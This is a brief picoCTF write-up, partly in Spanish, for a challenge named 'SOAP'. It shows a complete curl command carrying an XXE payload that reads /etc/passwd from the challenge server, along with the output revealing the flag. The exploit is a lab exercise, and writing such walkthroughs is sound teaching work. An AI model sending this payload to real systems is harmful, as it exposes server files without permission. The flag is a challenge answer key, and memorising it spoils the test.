# SOAP
# Descripción del reto:
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? http://saturn.picoctf.net:59816/
# Solución:
curl -s -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>' http://saturn.picoctf.net:59816/data | grep "picoCTF"
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}

'picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}'
# Notas adicionales
Vulnerabilidad XXE (XML External Entity) explotada inyectando un payload malicioso en la petición POST hacia la ruta /data para leer archivos locales del servidor.
# Referencias